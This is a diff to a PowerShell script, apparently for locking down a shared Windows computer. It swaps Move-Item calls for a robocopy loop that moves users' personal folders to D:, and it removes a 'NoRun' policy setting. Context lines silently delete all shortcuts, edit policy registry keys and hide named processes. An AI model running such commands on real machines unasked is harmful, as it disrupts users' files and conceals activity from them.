@@ -19,10 +19,6 @@ $Targets, $processesToHide = @("D:\DATALOSS_WARNING_README.txt", "D:\CollectGues
 $regPath, $sysPath, $p = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System", "HKCU:\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize"
 $startMenus = @("$env:ProgramData\Microsoft\Windows\Start Menu\Programs", "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs")
 
-New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Force | Out-Null
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" `
--Name NoRun -Value 1
-
 if (-not (Test-Path $WallpaperPath)) { Invoke-WebRequest -Uri $WallpaperUrl -OutFile $WallpaperPath -UseBasicParsing -ErrorAction SilentlyContinue }
 if (Test-Path $WallpaperPath) { [NativeWallpaper]::SetWallpaper($WallpaperPath) | Out-Null }
 
@@ -41,12 +37,21 @@ Remove-Item "$env:Public\Desktop\*.lnk" -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:USERPROFILE\Desktop\*.lnk" -Force -ErrorAction SilentlyContinue
 foreach ($path in $startMenus) { Get-ChildItem $path -Recurse -Filter "*.lnk" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue }
 
-Move-Item "$HOME\Desktop\*" "D:\Desktop" -Force -ErrorAction SilentlyContinue
-Move-Item "$HOME\Documents\*" "D:\Documents" -Force -ErrorAction SilentlyContinue
-Move-Item "$HOME\Downloads\*" "D:\Downloads" -Force -ErrorAction SilentlyContinue
-Move-Item "$HOME\Pictures\*" "D:\Pictures" -Force -ErrorAction SilentlyContinue
-Move-Item "$HOME\Videos\*" "D:\Videos" -Force -ErrorAction SilentlyContinue
-Move-Item "$HOME\Music\*" "D:\Music" -Force -ErrorAction SilentlyContinue
+$SourceTargetMap = @{
+    "$HOME\Desktop"   = "D:\Desktop"
+    "$HOME\Documents" = "D:\Documents"
+    "$HOME\Downloads" = "D:\Downloads"
+    "$HOME\Pictures"  = "D:\Pictures"
+    "$HOME\Videos"    = "D:\Videos"
+    "$HOME\Music"     = "D:\Music"
+}
+
+foreach ($Source in $SourceTargetMap.Keys) {
+    $Destination = $SourceTargetMap[$Source]
+    if (Test-Path $Source) {
+        robocopy $Source $Destination /MOVE /E /R:1 /W:1 /NFL /NDL /NJH /NJS > $null
+    }
+}
 
 foreach ($procName in $processesToHide) {
     $procs = Get-Process -Name $procName -ErrorAction SilentlyContinue
